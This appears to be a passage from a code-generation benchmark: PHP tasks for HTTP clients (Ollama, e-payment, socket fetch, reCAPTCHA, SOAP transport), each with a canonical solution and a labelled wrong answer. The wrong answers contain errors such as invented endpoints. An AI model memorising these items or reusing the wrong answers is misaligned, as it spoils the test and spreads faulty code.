[
  {
    "Task_id": 1,
    "Instruction": "Task Description: Create a PHP class that interacts with an Ollama API to generate responses using HTTP requests through the Guzzle HTTP client.\n\nClass Description: The Ollama class is designed to communicate with an Ollama API endpoint to generate responses based on provided prompts. It handles the configuration of the API request and processes the response.\n\nAttributes:\n- model: string - The name of the AI model to be used for generating responses.\n- prompt: string - The input text prompt to be sent to the AI model.\n- temperature: float - Controls the randomness of the output (higher values make output more random).\n- stream: bool - Determines whether the response should be streamed.\n- raw: bool - Specifies whether to use raw mode for the prompt processing.\n\nMethods:\n- __construct(string $model, string $prompt, float $temperature, bool $stream, bool $raw) -> void - Initializes the Ollama instance with the specified parameters for model interaction.\n- ask() -> string - Sends a POST request to the Ollama API with the configured parameters and returns the generated response from the AI model.",
    "Canonical_solution": "use GuzzleHttp\\Client;\n\nclass Ollama\n{\n    /**\n     * New service instance.\n     */\n    public function __construct(\n        protected string $model,\n        protected string $prompt,\n        protected float $temperature,\n        protected bool $stream,\n        protected bool $raw,\n    ) {}\n\n    /**\n     * Set LLM prompt text.\n     */\n    public function ask(): string\n    {\n        $httpClient = new Client;\n\n        $endpoint = core()->getConfigData('general.magic_ai.settings.api_domain').'/api/generate';\n\n        $result = $httpClient->request('POST', $endpoint, [\n            'headers' => [\n                'Accept' => 'application/json',\n            ],\n            'json'    => [\n                'model'  => $this->model,\n                'prompt' => $this->prompt,\n                'raw'    => $this->raw,\n                'stream' => $this->stream,\n            ],\n        ]);\n\n        $result = json_decode($result->getBody()->getContents(), true);\n\n        return $result['response'];\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nnamespace App\\Services;\n\nuse GuzzleHttp\\Client;\n\nclass Ollama\n{\n    private $model;\n    private $prompt;\n    private $temperature;\n    private $stream;\n    private $raw;\n\n    public function __construct(string $model, string $prompt, float $temperature, bool $stream, bool $raw)\n    {\n        $this->model = $model;\n        $this->prompt = $prompt;\n        $this->temperature = $temperature;\n        $this->stream = $stream;\n        $this->raw = $raw;\n    }\n\n    public function ask(): string\n    {\n        $client = new Client();\n        $response = $client->post('https://api.ollama.com/v1/generate', [\n            'json' => [\n                'model' => $this->model,\n                'prompt' => $this->prompt,\n                'temperature' => $this->temperature,\n                'stream' => $this->stream,\n                'raw' => $this->raw,\n            ],\n        ]);\n\n        return $response->getBody()->getContents();\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 10,
    "Instruction": "Task Description: Create a PHP class that implements an HTTP client for sending payment requests to an e-payment API using Guzzle.\n\nClass Description: The EpayHttpClient class is designed to handle HTTP communication with an e-payment API. It encapsulates the functionality for sending payment requests and processing the responses. The class uses Guzzle HTTP client for making requests and handles potential exceptions that may occur during the process.\n\nAttributes:\n- epay: array - Stores the configuration for the e-payment API\n- client: Client - The Guzzle HTTP client instance used for making requests\n\nMethods:\n- __construct(array $epayConfig) -> void - Initializes the class with e-payment configuration and creates a new Guzzle Client instance\n- sendPaymentRequest(array $data) -> array - Sends a payment request to the API endpoint and processes the response. Returns an array indicating success/failure and containing either the payment URL or an error message",
    "Canonical_solution": "use GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\GuzzleException;\n\nclass EpayHttpClient\n{\n    protected array $epay;\n    protected Client $client;\n\n    public function __construct(array $epayConfig)\n    {\n        $this->epay = $epayConfig;\n        $this->client = new Client();\n    }\n\n    public function sendPaymentRequest(array $data): array\n    {\n        try {\n            $res = $this->client->request('POST', $this->epay['apiurl'] . 'mapi.php', ['form_params' => $data]);\n\n            if ($res->getStatusCode() !== 200) {\n                throw new Exception();\n            }\n\n            $resData = json_decode($res->getBody()->__toString(), true);\n\n            if ($resData['code'] !== 1 || !isset($resData['payurl'])) {\n                throw new Exception();\n            }\n\n            return [\n                'success' => true,\n                'payurl' => $resData['payurl']\n            ];\n        } catch (Exception|GuzzleException) {\n            return [\n                'success' => false,\n                'error' => '\u8bf7\u6c42\u652f\u4ed8\u5931\u8d25'\n            ];\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 133,
    "wrong_result": "```php\n<?php\n\nuse GuzzleHttp\\Client;\nuse GuzzleHttp\\Exception\\RequestException;\n\nclass EpayHttpClient\n{\n    private $epay;\n    private $client;\n\n    public function __construct(array $epayConfig)\n    {\n        $this->epay = $epayConfig;\n        $this->client = new Client();\n    }\n\n    public function sendPaymentRequest(array $data): array\n    {\n        try {\n            $response = $this->client->post($this->epay['api_url'], [\n                'json' => $data\n            ]);\n\n            $responseData = json_decode($response->getBody(), true);\n\n            if ($response->getStatusCode() === 200) {\n                return [\n                    'success' => true,\n                    'payment_url' => $responseData['payment_url']\n                ];\n            } else {\n                return [\n                    'success' => false,\n                    'error' => $responseData['error']\n                ];\n            }\n        } catch (RequestException $e) {\n            return [\n                'success' => false,\n                'error' => $e->getMessage()\n            ];\n        }\n    }\n}\n?>\n```"
  },
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a PHP function that fetches content from a specified HTTP URL using fsockopen for low-level HTTP communication, with support for proxies and basic authentication.\n\nFunction Description: The function establishes a TCP connection to an HTTP server (or proxy), sends an HTTP GET request, reads the response, and returns the response body. It handles URL parsing, proxy configuration, timeout settings, and basic authentication. The function can either return the content directly or assign it to a template variable.\n\nInput:\n- $params: An associative array containing:\n  - 'file': (string, required) The HTTP URL to fetch\n  - 'assign': (string, optional) Template variable name to assign content to\n  - 'proxy_host': (string, optional) Proxy server hostname\n  - 'proxy_port': (int, optional) Proxy server port\n  - 'timeout': (int, optional) Connection timeout in seconds (default: 30)\n- $template: (object) The template object for assigning content (when 'assign' parameter is used)\n\nOutput:\n- Returns the fetched content as a string if 'assign' parameter is not provided\n- Assigns content to the specified template variable and returns nothing if 'assign' parameter is provided\n- Returns nothing and triggers notice on error conditions (invalid URL, connection failure)",
    "Canonical_solution": "function smarty_function_fetch($params, $template)\n{\n    if (empty($params['file'])) {\n        trigger_error(\"[plugin] fetch parameter 'file' cannot be empty\", E_USER_NOTICE);\n        return;\n    }\n\n    $content = '';\n    if (preg_match('!^http://!i', $params['file'])) {\n        if ($uri_parts = parse_url($params['file'])) {\n            $host = $server_name = $uri_parts['host'];\n            $timeout = 30;\n            $port = empty($uri_parts['port']) ? 80 : $uri_parts['port'];\n            $user = empty($uri_parts['user']) ? null : $uri_parts['user'];\n            $pass = empty($uri_parts['pass']) ? null : $uri_parts['pass'];\n            $uri = !empty($uri_parts['path']) ? $uri_parts['path'] : '/';\n            $uri .= !empty($uri_parts['query']) ? '?' . $uri_parts['query'] : '';\n            \n            $_is_proxy = false;\n            foreach ($params as $param_key => $param_value) {\n                switch ($param_key) {\n                    case \"proxy_host\":\n                        $proxy_host = $param_value;\n                        break;\n                    case \"proxy_port\":\n                        $proxy_port = (int)$param_value;\n                        break;\n                    case \"timeout\":\n                        $timeout = (int)$param_value;\n                        break;\n                }\n            }\n\n            if (!empty($proxy_host) && !empty($proxy_port)) {\n                $_is_proxy = true;\n                $fp = fsockopen($proxy_host, $proxy_port, $errno, $errstr, $timeout);\n            } else {\n                $fp = fsockopen($server_name, $port, $errno, $errstr, $timeout);\n            }\n\n            if (!$fp) {\n                trigger_error(\"[plugin] unable to fetch: $errstr ($errno)\", E_USER_NOTICE);\n                return;\n            }\n\n            if ($_is_proxy) {\n                fputs($fp, 'GET ' . $params['file'] . \" HTTP/1.0\\r\\n\");\n            } else {\n                fputs($fp, \"GET $uri HTTP/1.0\\r\\n\");\n            }\n            fputs($fp, \"Host: $host\\r\\n\");\n            if (!empty($user) && !empty($pass)) {\n                fputs($fp, \"Authorization: BASIC \" . base64_encode(\"$user:$pass\") . \"\\r\\n\");\n            }\n            fputs($fp, \"\\r\\n\");\n\n            while (!feof($fp)) {\n                $content .= fgets($fp, 4096);\n            }\n            fclose($fp);\n\n            $csplit = preg_split(\"!\\r\\n\\r\\n!\", $content, 2);\n            $content = $csplit[1];\n        }\n    }\n\n    if (!empty($params['assign'])) {\n        $template->assign($params['assign'], $content);\n    } else {\n        return $content;\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 131,
    "wrong_result": "```php\nfunction http_get($params, $template = null) {\n    $url = parse_url($params['file']);\n    if (!$url) {\n        trigger_error('Invalid URL');\n        return;\n    }\n    $host = $url['host'];\n    $port = isset($url['port']) ? $url['port'] : 80;\n    $path = isset($url['path']) ? $url['path'] : '/';\n    if (isset($url['query'])) {\n        $path .= '?' . $url['query'];\n    }\n    $timeout = isset($params['timeout']) ? $params['timeout'] : 30;\n    $proxy_host = isset($params['proxy_host']) ? $params['proxy_host'] : null;\n    $proxy_port = isset($params['proxy_port']) ? $params['proxy_port'] : null;\n    $username = isset($url['user']) ? $url['user'] : null;\n    $password = isset($url['pass']) ? $url['pass'] : null;\n    $out = \"GET $path HTTP/1.0\\r\\n\";\n    $out .= \"Host: $host\\r\\n\";\n    if ($proxy_host) {\n        $out .= \"Proxy-Connection: close\\r\\n\";\n    }\n    if ($username && $password) {\n        $out .= \"Authorization: Basic \" . base64_encode(\"$username:$password\") . \"\\r\\n\";\n    }\n    $out .= \"\\r\\n\";\n    $fp = fsockopen(($proxy_host ? $proxy_host : $host), ($proxy_port ? $proxy_port : $port), $errno, $errstr, $timeout);\n    if (!$fp) {\n        trigger_error(\"HTTP request failed: $errstr ($errno)\");\n        return;\n    }\n    fwrite($fp, $out);\n    $response = '';\n    while (!feof($fp)) {\n        $response .= fgets($fp, 4096);\n    }\n    fclose($fp);\n    $response = explode(\"\\r\\n\\r\\n\", $response, 2);\n    if (isset($params['assign'])) {\n        $template->assign($params['assign'], $response[1]);\n    } else {\n        return $response[1];\n    }\n}\n```"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Implement a class that handles HTTP POST requests to Google's reCAPTCHA verification service using low-level socket operations in PHP.\n\nClass Description: ReCaptchaSocketPostRequestMethod is a class that implements reCAPTCHA verification by establishing a direct socket connection to Google's servers, sending an HTTP POST request, and processing the response. It provides an alternative to higher-level HTTP clients.\n\nAttributes:\n- socket: [ReCaptchaSocket] - The socket connection handler used for HTTP communication\n- RECAPTCHA_HOST: [string] - Constant storing Google's reCAPTCHA hostname ('www.google.com')\n- SITE_VERIFY_PATH: [string] - Constant storing the reCAPTCHA verification endpoint path ('/recaptcha/api/siteverify')\n- BAD_REQUEST: [string] - Constant JSON response for failed requests\n- BAD_RESPONSE: [string] - Constant JSON response for invalid server responses\n\nMethods:\n- __construct([ReCaptchaSocket $socket = null]) -> [void] - Initializes the class with an optional socket dependency injection\n- submit(ReCaptchaRequestParameters $params) -> [string] - Performs the reCAPTCHA verification by:\n  1. Opening an SSL socket connection to Google's server\n  2. Formatting and sending an HTTP POST request with verification parameters\n  3. Reading and parsing the server response\n  4. Returning the verification result as JSON string\n  Returns either the server response or error JSON if the request/response fails",
    "Canonical_solution": "class ReCaptchaSocketPostRequestMethod implements ReCaptchaRequestMethod\n{\n    const RECAPTCHA_HOST = 'www.google.com';\n    const SITE_VERIFY_PATH = '/recaptcha/api/siteverify';\n    const BAD_REQUEST = '{\"success\": false, \"error-codes\": [\"invalid-request\"]}';\n    const BAD_RESPONSE = '{\"success\": false, \"error-codes\": [\"invalid-response\"]}';\n    private $socket;\n\n    public function __construct(ReCaptchaSocket $socket = null)\n    {\n        if (!is_null($socket)) {\n            $this->socket = $socket;\n        } else {\n            $this->socket = new ReCaptchaSocket();\n        }\n    }\n\n    public function submit(ReCaptchaRequestParameters $params)\n    {\n        $errno = 0;\n        $errstr = '';\n\n        if (false === $this->socket->fsockopen('ssl://' . self::RECAPTCHA_HOST, 443, $errno, $errstr, 30)) {\n            return self::BAD_REQUEST;\n        }\n\n        $content = $params->toQueryString();\n\n        $request = \"POST \" . self::SITE_VERIFY_PATH . \" HTTP/1.1\\r\\n\";\n        $request .= \"Host: \" . self::RECAPTCHA_HOST . \"\\r\\n\";\n        $request .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\n        $request .= \"Content-length: \" . strlen($content) . \"\\r\\n\";\n        $request .= \"Connection: close\\r\\n\\r\\n\";\n        $request .= $content . \"\\r\\n\\r\\n\";\n\n        $this->socket->fwrite($request);\n        $response = '';\n\n        while (!$this->socket->feof()) {\n            $response .= $this->socket->fgets(4096);\n        }\n\n        $this->socket->fclose();\n\n        if (0 !== strpos($response, 'HTTP/1.1 200 OK')) {\n            return self::BAD_RESPONSE;\n        }\n\n        $parts = preg_split(\"#\\n\\s*\\n#Uis\", $response);\n\n        return $parts[1];\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 131,
    "wrong_result": "```php\nclass ReCaptchaSocketPostRequestMethod {\n    private $socket;\n    private const RECAPTCHA_HOST = 'www.google.com';\n    private const SITE_VERIFY_PATH = '/recaptcha/api/siteverify';\n    private const BAD_REQUEST = '{\"success\": false, \"error-codes\": [\"invalid-input-secret\"]}';\n    private const BAD_RESPONSE = '{\"success\": false, \"error-codes\": [\"invalid-input-response\"]}';\n\n    public function __construct(ReCaptchaSocket $socket = null) {\n        $this->socket = $socket ?? new ReCaptchaSocket();\n    }\n\n    public function submit(ReCaptchaRequestParameters $params): string {\n        $socket = $this->socket->open(self::RECAPTCHA_HOST, 443, true);\n        if (!$socket) {\n            return self::BAD_REQUEST;\n        }\n\n        $post_data = http_build_query([\n            'secret' => $params->getSecret(),\n            'response' => $params->getResponse(),\n            'remoteip' => $params->getRemoteIp(),\n        ]);\n\n        $request = \"POST \" . self::SITE_VERIFY_PATH . \" HTTP/1.1\\r\\n\";\n        $request .= \"Host: \" . self::RECAPTCHA_HOST . \"\\r\\n\";\n        $request .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\n        $request .= \"Content-Length: \" . strlen($post_data) . \"\\r\\n\";\n        $request .= \"Connection: close\\r\\n\\r\\n\";\n        $request .= $post_data;\n\n        $this->socket->write($socket, $request);\n\n        $response = $this->socket->read($socket);\n        $this->socket->close($socket);\n\n        if ($response === false) {\n            return self::BAD_RESPONSE;\n        }\n\n        return $response;\n    }\n}\n```"
  },
  {
    "Task_id": 105,
    "Instruction": "Task Description: Create a PHP class for handling HTTP/HTTPS communications using either socket-based connections (via fsockopen) or cURL, supporting both standard and persistent connections, with proper header and cookie management.\n\nClass Description: The soap_transport_http class provides low-level HTTP transport capabilities for SOAP communications, supporting both socket and cURL implementations. It handles connection management, request/response processing, and error handling.\n\nAttributes:\n- url: string - The target URL for HTTP requests\n- uri: string - The URI portion of the URL\n- scheme: string - The protocol scheme (http/https)\n- host: string - The target hostname\n- port: string - The target port number\n- path: string - The path portion of the URL\n- request_method: string - HTTP method (default: POST)\n- protocol_version: string - HTTP version (default: 1.0)\n- outgoing_headers: array - Headers to be sent with the request\n- incoming_headers: array - Headers received in the response\n- outgoing_payload: string - Data to be sent in the request\n- incoming_payload: string - Data received in the response\n- persistentConnection: bool - Flag for persistent connections\n- use_curl: bool - Flag to use cURL instead of sockets\n- proxy: array|null - Proxy configuration if used\n\nMethods:\n- __construct(string $url, array $curl_options=null, bool $use_curl=false) -> void - Initializes the transport with target URL and options\n- connect(int $connection_timeout=0, int $response_timeout=30) -> bool - Establishes connection to server\n- send(string $data, int $timeout=0, int $response_timeout=30, array $cookies=null) -> mixed - Sends data and returns response\n- sendRequest(string $data, array $cookies=null) -> bool - Sends the HTTP request with headers\n- getResponse() -> string|bool - Reads and processes the server response\n- setHeader(string $name, string $value) -> void - Adds a header to outgoing request\n- setCurlOption(mixed $option, mixed $value) -> void - Sets cURL option when using cURL\n- parseCookie(string $cookie_str) -> array|bool - Parses Set-Cookie header into array",
    "Canonical_solution": "class soap_transport_http extends nusoap_base {\n    var $url = '';\n    var $uri = '';\n    var $digest_uri = '';\n    var $scheme = '';\n    var $host = '';\n    var $port = '';\n    var $path = '';\n    var $request_method = 'POST';\n    var $protocol_version = '1.0';\n    var $encoding = '';\n    var $outgoing_headers = array();\n    var $incoming_headers = array();\n    var $incoming_cookies = array();\n    var $outgoing_payload = '';\n    var $incoming_payload = '';\n    var $response_status_line;\n    var $useSOAPAction = true;\n    var $persistentConnection = false;\n    var $ch = false;\n    var $ch_options = array();\n    var $use_curl = false;\n    var $proxy = null;\n    var $username = '';\n    var $password = '';\n    var $authtype = '';\n    var $digestRequest = array();\n    var $certRequest = array();\n\n    function soap_transport_http($url, $curl_options = NULL, $use_curl = false) {\n        parent::nusoap_base();\n        $this->debug(\"ctor url=$url use_curl=$use_curl curl_options:\");\n        $this->appendDebug($this->varDump($curl_options));\n        $this->setURL($url);\n        if (is_array($curl_options)) {\n            $this->ch_options = $curl_options;\n        }\n        $this->use_curl = $use_curl;\n        preg_match('/\\$Revisio' . 'n: ([^ ]+)/', $this->revision, $rev);\n        $this->setHeader('User-Agent', $this->title.'/'.$this->version.' ('.$rev[1].')');\n    }\n\n    function connect($connection_timeout=0,$response_timeout=30) {\n        $this->debug(\"connect connection_timeout $connection_timeout, response_timeout $response_timeout, scheme $this->scheme, host $this->host, port $this->port\");\n        if ($this->io_method() == 'socket') {\n            if (!is_array($this->proxy)) {\n                $host = $this->host;\n                $port = $this->port;\n            } else {\n                $host = $this->proxy['host'];\n                $port = $this->proxy['port'];\n            }\n\n            if($this->persistentConnection && isset($this->fp) && is_resource($this->fp)){\n                if (!feof($this->fp)) {\n                    $this->debug('Re-use persistent connection');\n                    return true;\n                }\n                fclose($this->fp);\n                $this->debug('Closed persistent connection at EOF');\n            }\n\n            if ($this->scheme == 'ssl') {\n                $host = 'ssl://' . $host;\n            }\n            $this->debug('calling fsockopen with host ' . $host . ' connection_timeout ' . $connection_timeout);\n\n            if($connection_timeout > 0){\n                $this->fp = @fsockopen( $host, $this->port, $this->errno, $this->error_str, $connection_timeout);\n            } else {\n                $this->fp = @fsockopen( $host, $this->port, $this->errno, $this->error_str);\n            }\n            \n            if(!$this->fp) {\n                $msg = 'Couldn\\'t open socket connection to server ' . $this->url;\n                if ($this->errno) {\n                    $msg .= ', Error ('.$this->errno.'): '.$this->error_str;\n                } else {\n                    $msg .= ' prior to connect().  This is often a problem looking up the host name.';\n                }\n                $this->debug($msg);\n                $this->setError($msg);\n                return false;\n            }\n            \n            $this->debug('set response timeout to ' . $response_timeout);\n            socket_set_timeout( $this->fp, $response_timeout);\n\n            $this->debug('socket connected');\n            return true;\n        } else if ($this->io_method() == 'curl') {\n            if (!extension_loaded('curl')) {\n                $this->setError('The PHP cURL Extension is required for HTTPS or NLTM.  You will need to re-build or update your PHP to include cURL or change php.ini to load the PHP cURL extension.');\n                return false;\n            }\n            $this->debug('connect using cURL');\n            $this->ch = curl_init();\n            $hostURL = ($this->port != '') ? \"$this->scheme://$this->host:$this->port\" : \"$this->scheme://$this->host\";\n            $hostURL .= $this->path;\n            $this->setCurlOption(CURLOPT_URL, $hostURL);\n            if (ini_get('safe_mode') || ini_get('open_basedir')) {\n                $this->debug('safe_mode or open_basedir set, so do not set CURLOPT_FOLLOWLOCATION');\n            } else {\n                $this->setCurlOption(CURLOPT_FOLLOWLOCATION, 1);\n            }\n            $this->setCurlOption(CURLOPT_HEADER, 1);\n            $this->setCurlOption(CURLOPT_RETURNTRANSFER, 1);\n            if ($this->persistentConnection) {\n                $this->persistentConnection = false;\n                $this->setHeader('Connection', 'close');\n            }\n            if ($connection_timeout != 0) {\n                $this->setCurlOption(CURLOPT_CONNECTIONTIMEOUT, $connection_timeout);\n            }\n            if ($response_timeout != 0) {\n                $this->setCurlOption(CURLOPT_TIMEOUT, $response_timeout);\n            }\n            $this->debug('cURL connection set up');\n            return true;\n        } else {\n            $this->setError('Unknown scheme ' . $this->scheme);\n            $this->debug('Unknown scheme ' . $this->scheme);\n            return false;\n        }\n    }\n\n    function send($data, $timeout=0, $response_timeout=30, $cookies=NULL) {\n        $this->debug('entered send() with data of length: '.strlen($data));\n        $this->tryagain = true;\n        $tries = 0;\n        while ($this->tryagain) {\n            $this->tryagain = false;\n            if ($tries++ < 2) {\n                if (!$this->connect($timeout, $response_timeout)){\n                    return false;\n                }\n                if (!$this->sendRequest($data, $cookies)){\n                    return false;\n                }\n                $respdata = $this->getResponse();\n            } else {\n                $this->setError(\"Too many tries to get an OK response ($this->response_status_line)\");\n            }\n        }        \n        $this->debug('end of send()');\n        return $respdata;\n    }\n\n    function sendRequest($data, $cookies = NULL) {\n        $cookie_str = $this->getCookiesForRequest($cookies, (($this->scheme == 'ssl') || ($this->scheme == 'https')));\n        $this->buildPayload($data, $cookie_str);\n        if ($this->io_method() == 'socket') {\n            if(!fputs($this->fp, $this->outgoing_payload, strlen($this->outgoing_payload))) {\n                $this->setError('couldn\\'t write message data to socket');\n                $this->debug('couldn\\'t write message data to socket');\n                return false;\n            }\n            $this->debug('wrote data to socket, length = ' . strlen($this->outgoing_payload));\n            return true;\n        } else if ($this->io_method() == 'curl') {\n            $curl_headers = array();\n            foreach($this->outgoing_headers as $k => $v){\n                if ($k == 'Connection' || $k == 'Content-Length' || $k == 'Host' || $k == 'Authorization' || $k == 'Proxy-Authorization') {\n                    $this->debug(\"Skip cURL header $k: $v\");\n                } else {\n                    $curl_headers[] = \"$k: $v\";\n                }\n            }\n            if ($cookie_str != '') {\n                $curl_headers[] = 'Cookie: ' . $cookie_str;\n            }\n            $this->setCurlOption(CURLOPT_HTTPHEADER, $curl_headers);\n            $this->debug('set cURL HTTP headers');\n            if ($this->request_method == \"POST\") {\n                $this->setCurlOption(CURLOPT_POST, 1);\n                $this->setCurlOption(CURLOPT_POSTFIELDS, $data);\n                $this->debug('set cURL POST data');\n            }\n            foreach ($this->ch_options as $key => $val) {\n                $this->setCurlOption($key, $val);\n            }\n            $this->debug('set cURL payload');\n            return true;\n        }\n    }\n\n    function getResponse(){\n        $this->incoming_payload = '';\n        if ($this->io_method() == 'socket') {\n            $data = '';\n            while (!isset($lb)){\n                if(feof($this->fp)) {\n                    $this->incoming_payload = $data;\n                    $this->debug('found no headers before EOF after length ' . strlen($data));\n                    $this->debug(\"received before EOF:\\n\" . $data);\n                    $this->setError('server failed to send headers');\n                    return false;\n                }\n                $tmp = fgets($this->fp, 256);\n                $tmplen = strlen($tmp);\n                $this->debug(\"read line of $tmplen bytes: \" . trim($tmp));\n                if ($tmplen == 0) {\n                    $this->incoming_payload = $data;\n                    $this->debug('socket read of headers timed out after length ' . strlen($data));\n                    $this->debug(\"read before timeout: \" . $data);\n                    $this->setError('socket read of headers timed out');\n                    return false;\n                }\n                $data .= $tmp;\n                $pos = strpos($data,\"\\r\\n\\r\\n\");\n                if($pos > 1){\n                    $lb = \"\\r\\n\";\n                } else {\n                    $pos = strpos($data,\"\\n\\n\");\n                    if($pos > 1){\n                        $lb = \"\\n\";\n                    }\n                }\n                if (isset($lb) && preg_match('/^HTTP\\/1.1 100/',$data)) {\n                    unset($lb);\n                    $data = '';\n                }\n            }\n            $this->incoming_payload .= $data;\n            $this->debug('found end of headers after length ' . strlen($data));\n            $header_data = trim(substr($data,0,$pos));\n            $header_array = explode($lb,$header_data);\n            $this->incoming_headers = array();\n            $this->incoming_cookies = array();\n            foreach($header_array as $header_line){\n                $arr = explode(':',$header_line, 2);\n                if(count($arr) > 1){\n                    $header_name = strtolower(trim($arr[0]));\n                    $this->incoming_headers[$header_name] = trim($arr[1]);\n                    if ($header_name == 'set-cookie') {\n                        $cookie = $this->parseCookie(trim($arr[1]));\n                        if ($cookie) {\n                            $this->incoming_cookies[] = $cookie;\n                            $this->debug('found cookie: ' . $cookie['name'] . ' = ' . $cookie['value']);\n                        } else {\n                            $this->debug('did not find cookie in ' . trim($arr[1]));\n                        }\n                    }\n                } else if (isset($header_name)) {\n                    $this->incoming_headers[$header_name] .= $lb . ' ' . $header_line;\n                }\n            }\n            if (isset($this->incoming_headers['transfer-encoding']) && strtolower($this->incoming_headers['transfer-encoding']) == 'chunked') {\n                $content_length =  2147483647;\n                $chunked = true;\n                $this->debug(\"want to read chunked content\");\n            } elseif (isset($this->incoming_headers['content-length'])) {\n                $content_length = $this->incoming_headers['content-length'];\n                $chunked = false;\n                $this->debug(\"want to read content of length $content_length\");\n            } else {\n                $content_length =  2147483647;\n                $chunked = false;\n                $this->debug(\"want to read content to EOF\");\n            }\n            $data = '';\n            do {\n                if ($chunked) {\n                    $tmp = fgets($this->fp, 256);\n                    $tmplen = strlen($tmp);\n                    $this->debug(\"read chunk line of $tmplen bytes\");\n                    if ($tmplen == 0) {\n                        $this->incoming_payload = $data;\n                        $this->debug('socket read of chunk length timed out after length ' . strlen($data));\n                        $this->debug(\"read before timeout:\\n\" . $data);\n                        $this->setError('socket read of chunk length timed out');\n                        return false;\n                    }\n                    $content_length = hexdec(trim($tmp));\n                    $this->debug(\"chunk length $content_length\");\n                }\n                $strlen = 0;\n                while (($strlen < $content_length) && (!feof($this->fp))) {\n                    $readlen = min(8192, $content_length - $strlen);\n                    $tmp = fread($this->fp, $readlen);\n                    $tmplen = strlen($tmp);\n                    $this->debug(\"read buffer of $tmplen bytes\");\n                    if (($tmplen == 0) && (!feof($this->fp))) {\n                        $this->incoming_payload = $data;\n                        $this->debug('socket read of body timed out after length ' . strlen($data));\n                        $this->debug(\"read before timeout:\\n\" . $data);\n                        $this->setError('socket read of body timed out');\n                        return false;\n                    }\n                    $strlen += $tmplen;\n                    $data .= $tmp;\n                }\n                if ($chunked && ($content_length > 0)) {\n                    $tmp = fgets($this->fp, 256);\n                    $tmplen = strlen($tmp);\n                    $this->debug(\"read chunk terminator of $tmplen bytes\");\n                    if ($tmplen == 0) {\n                        $this->incoming_payload = $data;\n                        $this->debug('socket read of chunk terminator timed out after length ' . strlen($data));\n                        $this->debug(\"read before timeout:\\n\" . $data);\n                        $this->setError('socket read of chunk terminator timed out');\n                        return false;\n                    }\n                }\n            } while ($chunked && ($content_length > 0) && (!feof($this->fp)));\n            if (feof($this->fp)) {\n                $this->debug('read to EOF');\n            }\n            $this->debug('read body of length ' . strlen($data));\n            $this->incoming_payload .= $data;\n            $this->debug('received a total of '.strlen($this->incoming_payload).' bytes of data from server');\n            if(\n                (isset($this->incoming_headers['connection']) && strtolower($this->incoming_headers['connection']) == 'close') || \n                (! $this->persistentConnection) || feof($this->fp)){\n                fclose($this->fp);\n                $this->fp = false;\n                $this->debug('closed socket');\n            }\n            if($this->incoming_payload == ''){\n                $this->setError('no response from server');\n                return false;\n            }\n            return $data;\n        } else if ($this->io_method() == 'curl') {\n            $this->debug('send and receive with cURL');\n            $this->incoming_payload = curl_exec($this->ch);\n            $data = $this->incoming_payload;\n            $cErr = curl_error($this->ch);\n            if ($cErr != '') {\n                $err = 'cURL ERROR: '.curl_errno($this->ch).': '.$cErr.'<br>';\n                foreach(curl_getinfo($this->ch) as $k => $v){\n                    $err .= \"$k: $v<br>\";\n                }\n                $this->debug($err);\n                $this->setError($err);\n                curl_close($this->ch);\n                return false;\n            }\n            $this->debug('No cURL error, closing cURL');\n            curl_close($this->ch);\n            $savedata = $data;\n            while ($this->isSkippableCurlHeader($data)) {\n                $this->debug(\"Found HTTP header to skip\");\n                if ($pos = strpos($data,\"\\r\\n\\r\\n\")) {\n                    $data = ltrim(substr($data,$pos));\n                } elseif($pos = strpos($data,\"\\n\\n\") ) {\n                    $data = ltrim(substr($data,$pos));\n                }\n            }\n            if ($data == '') {\n                $data = $savedata;\n                while (preg_match('/^HTTP\\/1.1 100/',$data)) {\n                    if ($pos = strpos($data,\"\\r\\n\\r\\n\")) {\n                        $data = ltrim(substr($data,$pos));\n                    } elseif($pos = strpos($data,\"\\n\\n\") ) {\n                        $data = ltrim(substr($data,$pos));\n                    }\n                }\n            }\n            if ($pos = strpos($data,\"\\r\\n\\r\\n\")) {\n                $lb = \"\\r\\n\";\n            } elseif( $pos = strpos($data,\"\\n\\n\")) {\n                $lb = \"\\n\";\n            } else {\n                $this->debug('no proper separation of headers and document');\n                $this->setError('no proper separation of headers and document');\n                return false;\n            }\n            $header_data = trim(substr($data,0,$pos));\n            $header_array = explode($lb,$header_data);\n            $data = ltrim(substr($data,$pos));\n            $this->debug('found proper separation of headers and document');\n            $this->debug('cleaned data, stringlen: '.strlen($data));\n            foreach ($header_array as $header_line) {\n                $arr = explode(':',$header_line",
    "Code_level": "Class-level",
    "FSMID_for_test": 131,
    "wrong_result": "```php\nclass soap_transport_http {\n    private $url;\n    private $uri;\n    private $scheme;\n    private $host;\n    private $port;\n    private $path;\n    private $request_method = 'POST';\n    private $protocol_version = '1.0';\n    private $outgoing_headers = array();\n    private $incoming_headers = array();\n    private $outgoing_payload;\n    private $incoming_payload;\n    private $persistentConnection = false;\n    private $use_curl = false;\n    private $proxy = null;\n    private $curl;\n    private $socket;\n    private $socket_timeout = 30;\n    private $connection_timeout = 0;\n    private $response_timeout = 30;\n    private $cookies = array();\n\n    public function __construct(string $url, array $curl_options=null, bool $use_curl=false) {\n        $this->url = $url;\n        $this->parseUrl();\n        $this->use_curl = $use_curl;\n        if ($use_curl) {\n            $this->curl = curl_init();\n            if ($curl_options) {\n                curl_setopt_array($this->curl, $curl_options);\n            }\n        }\n    }\n\n    public function connect(int $connection_timeout=0, int $response_timeout=30): bool {\n        $this->connection_timeout = $connection_timeout;\n        $this->response_timeout = $response_timeout;\n        if ($this->use_curl) {\n            curl_setopt($this->curl, CURLOPT_URL, $this->url);\n            curl_setopt($this->curl, CURLOPT_PORT, $this->port);\n            curl_setopt($this->curl, CURLOPT_RETURNTRANSFER, true);\n            curl_setopt($this->curl, CURLOPT_HEADER, true);\n            curl_setopt($this->curl, CURLOPT_TIMEOUT, $this->response_timeout);\n            if ($this->persistentConnection) {\n                curl_setopt($this->curl, CURLOPT_FORBID_REUSE, false);\n            } else {\n                curl_setopt($this->curl, CURLOPT_FORBID_REUSE, true);\n            }\n            if ($this->proxy) {\n                curl_setopt($this->curl, 